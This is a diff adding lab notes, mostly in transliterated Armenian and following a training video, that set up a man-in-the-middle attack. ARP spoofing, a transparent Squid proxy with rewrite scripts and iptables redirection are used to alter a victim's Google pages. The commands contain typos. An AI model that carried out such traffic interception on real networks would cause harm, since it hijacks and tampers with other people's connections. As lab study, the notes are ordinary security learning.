@@ -1,0 +1,69 @@
+video 5 01:08:00
+SQUID:
+acl localnet src 192.168.0.0/16
+http_access allow localnet
+http_port 3128 transparent
+url_rewrite_program /PATH_TO/asciiImages.pl
+
+ghostscript (optional install)
+Apache:
+	mkdir /var/www/tmp
+	chmod 777 /var/www/tmp
+	
+iptables -t nat -A PREROUTING -i wlan0 -p tcp --destination-port 80 - j REDIRECT --to-port 3128
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+SOME SCRIPTS:
+
+
+
+--------------------------------------------------
+apt-cache search squid3    ->squid proxy e
+apt-get install squid3 -y
+apt-cache search apache
+apt-get install apache2
+
+apt-get -y install imagemagick ghostscript jp2a   ->install enq anum ays 3 cragrer@, mez anhrajesht en sranq hardzakman hamar
+
+
+internetic qashum enq mez anhrajesht scriptner@
+
+nano /etc/squid3/squid.conf   ->configuracnum enq mer squid cragir@
+	commentic hanum enq  video 5 01:24:00
+		#acl localnet src 192.168.0.0/16
+		#http_access allow localnet
+		#http_port 3128 transparent   -> mer mot chi lini transparent petq e avelacnenq
+		ev fayli amenaverjum kavelacnenq ->     url_rewrite_program /root/googleSearch.pl
+	
+service squid3 restart
+
+iptables -t nat -A PREROUTING -i eth0 -p tcp --destination-port 80 -j REDIRECT --to-port 3128
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+hima configuracnum enq apache
+mkdir /var/www/tmp
+chmod 777 /var/www/tmp
+service apache2 restart  kam service httpd restart
+
+aysqanov avartecinq configuracian hima petq e katarenq arpspufing
+arajin terminalov  		->arpspoof -i eth0 -t 192.168.0.1 - r 192.168.0.1
+erkrord terminalov  	->arpspoof -i eth0 -t 192.168.0.1 - r 192.168.0.101
+
+hima bacum enq windowsi terminal@ -> vorpeszi imananq henc ayd compn enq spoofing anum<<karevor e imanal>>
+		arp -a  -> ete tesnum enq 2 mac addressner@ krknvum en uremn lav che
+	bacum enq windowsi browser ev serch enq anum google, tesnum enq google -i verjum avelacel e linux bar@
+		vorpeszi poxenq linux bar@ petq e scripti mej popox80 anenq
+		
+		nano googleSearch.pl
+			tesnum enq extraText = "Linux"
+			poxum enq linux bar@ mek aylov u ete mi qani bar petq e grvi grum enq + nshanov(hello+world)
+			service squid3 restart
+			myus terminali vra der sharunakvum e arpspoofing@ vor chi xangarum squid3-i restartin
+			
+			windowsi borwseri refreshi jamanak  khaytnvi nor hello world
+			01:46:00
+			
+	
+		
+
